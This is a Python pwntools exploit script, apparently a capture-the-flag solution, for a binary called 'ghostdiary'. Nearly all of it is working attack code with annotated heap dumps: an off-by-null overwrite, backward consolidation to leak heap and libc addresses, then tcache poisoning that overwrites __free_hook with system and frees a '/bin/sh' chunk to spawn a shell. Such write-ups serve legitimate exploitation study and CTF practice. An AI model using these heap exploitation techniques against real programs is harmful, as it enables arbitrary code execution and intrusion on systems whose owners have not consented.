#!/usr/bin/env python3

from pwn import *

elf = ELF('./ghostdiary')

libc = elf.libc


#context.log_level = 'debug'

gs = '''
    handle SIGALRM ignore
    continue
    dir ./malloc/
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return elf.process()

io = start()


def malloc(size):
    io.sendlineafter(b'> ', b'1')
    if size < 0xf1:
        io.sendlineafter(b'> ', b'1')
        io.sendlineafter(b'size: ', f'{size}'.encode())
        io.recvuntil(b'page #')
        return int(io.recvline().strip())
    elif 0x10f < size < 0x1e1:
        io.sendlineafter(b'>', b'2')
        io.sendlineafter(b'size: ', f'{size}'.encode())
        io.recvuntil(b'page #')
        return int(io.recvline().strip())
    else:
        print('i don\'t know that size mate')

def free(index):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Page: ', f'{index}'.encode())

def edit(index, content):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Page: ', f'{index}'.encode())
    io.sendlineafter(b'Content: ', content)

def show(index):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Page: ', f'{index}'.encode())
    io.recvuntil(b'Content: ')



# exploit starts here

chunk_A = malloc(0x88) # 0

chunk_B = malloc(0x58) # 1

chunk_C = malloc(0xf0) # 2


for i in range(7):
    malloc(0xf0)

for i in range(7):
    free(i+3)

chunk_D = malloc(0xf0)

show(chunk_D)

heap = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x990

log.success(f'heap @ 0x{heap:02x}')


free(chunk_D) # free this to fill the tcachebin


edit(chunk_A, p64(0x0) + p64(0xe0) + p64(heap+0x2a0)*2) # craft a fake chunk inside this chunk (the reason for this is to craft a chunk with size field equal to the chunk we will free's prev_size  prev_size(chunk_C) = size(chunk_A))

edit(chunk_B, b'A'*0x50 + p64(0xe0)) # trigger off-by-null and set prev_size

free(chunk_C) # trigger backward consolidation

'''
0x555555606290:	0x0000000000000000	0x0000000000000091 -----> chunk_A
0x5555556062a0:	0x0000000000000000	0x00000000000001e1 -----> unsortedbin chunk inside chunk_A
0x5555556062b0:	0x00007ffff7bb5be0	0x00007ffff7bb5be0
0x5555556062c0:	0x0000000000000000	0x0000000000000000
0x5555556062d0:	0x0000000000000000	0x0000000000000000
0x5555556062e0:	0x0000000000000000	0x0000000000000000
0x5555556062f0:	0x0000000000000000	0x0000000000000000
0x555555606300:	0x0000000000000000	0x0000000000000000
0x555555606310:	0x0000000000000000	0x0000000000000000
0x555555606320:	0x0000000000000000	0x0000000000000061 -----> chunk_B
0x555555606330:	0x4141414141414141	0x4141414141414141
0x555555606340:	0x4141414141414141	0x4141414141414141
0x555555606350:	0x4141414141414141	0x4141414141414141
0x555555606360:	0x4141414141414141	0x4141414141414141
0x555555606370:	0x4141414141414141	0x4141414141414141
0x555555606380:	0x00000000000000e0	0x0000000000000100 -----> chunk_C
0x555555606390:	0x0000000000000000	0x0000000000000000
0x5555556063a0:	0x0000000000000000	0x0000000000000000
0x5555556063b0:	0x0000000000000000	0x0000000000000000
0x5555556063c0:	0x0000000000000000	0x0000000000000000
0x5555556063d0:	0x0000000000000000	0x0000000000000000
0x5555556063e0:	0x0000000000000000	0x0000000000000000
0x5555556063f0:	0x0000000000000000	0x0000000000000000
                        [......]
                                                        -----> rest of tcache freed chunks
'''

chunk_E = malloc(0x78) # split the unsortedbin chunk and return 0x80 chunk so we can leak libc

show(chunk_E)

libc.address = u64(io.recvline().strip().ljust(8,b'\x00')) - 0x3b5db0

log.success(f'libc @ 0x{libc.address:02x}')

'''
0x555555606290:	0x0000000000000000	0x0000000000000091  -----> chunk_A
0x5555556062a0:	0x0000000000000000	0x0000000000000081 ------> chunk_E
0x5555556062b0:	0x00007ffff7bb5db0	0x00007ffff7bb5db0
0x5555556062c0:	0x0000000000000000	0x0000000000000000
0x5555556062d0:	0x0000000000000000	0x0000000000000000
0x5555556062e0:	0x0000000000000000	0x0000000000000000
0x5555556062f0:	0x0000000000000000	0x0000000000000000
0x555555606300:	0x0000000000000000	0x0000000000000000
0x555555606310:	0x0000000000000000	0x0000000000000000
0x555555606320:	0x0000000000000000	0x0000000000000161 ------> chunk_B , unsorted chunk
0x555555606330:	0x00007ffff7bb5be0	0x00007ffff7bb5be0
0x555555606340:	0x4141414141414141	0x4141414141414141
0x555555606350:	0x4141414141414141	0x4141414141414141
0x555555606360:	0x4141414141414141	0x4141414141414141
0x555555606370:	0x4141414141414141	0x4141414141414141
0x555555606380:	0x00000000000000e0	0x0000000000000100
0x555555606390:	0x0000000000000000	0x0000000000000000
0x5555556063a0:	0x0000000000000000	0x0000000000000000
0x5555556063b0:	0x0000000000000000	0x0000000000000000
0x5555556063c0:	0x0000000000000000	0x0000000000000000
0x5555556063d0:	0x0000000000000000	0x0000000000000000
0x5555556063e0:	0x0000000000000000	0x0000000000000000
0x5555556063f0:	0x0000000000000000	0x0000000000000000
0x555555606400:	0x0000000000000000	0x0000000000000000
0x555555606410:	0x0000000000000000	0x0000000000000000
0x555555606420:	0x0000000000000000	0x0000000000000000
0x555555606430:	0x0000000000000000	0x0000000000000000
0x555555606440:	0x0000000000000000	0x0000000000000000
0x555555606450:	0x0000000000000000	0x0000000000000000
0x555555606460:	0x0000000000000000	0x0000000000000000
0x555555606470:	0x0000000000000000	0x0000000000000000

'''

# tcache poisoning attack

chunk_F = malloc(0x78) # allocate a chunk from the unsortedbin 

free(chunk_F) # tcache chunk_F -> 0
free(chunk_E) # chunk_E -> chunk_F -> 0

edit(chunk_A, b'A'*0x10 + p64(libc.sym.__free_hook)) # tamper with chunk_E's FD to point to __free_hook since chunk_A overlapps chunk_E now tcache bin looks like chunk_E -> __free_hook -> 0


chunk_G = malloc(0x78) # allocate the authentic chunk

chunk_H = malloc(0x78) # allocate the one overlapping __free_hook

edit(chunk_H, p64(libc.sym.system)) # overwrite __free_hook with system
edit(chunk_G, b'/bin/sh\x00') 

free(chunk_G) # trigger system('/bin/sh\x00')

io.interactive()
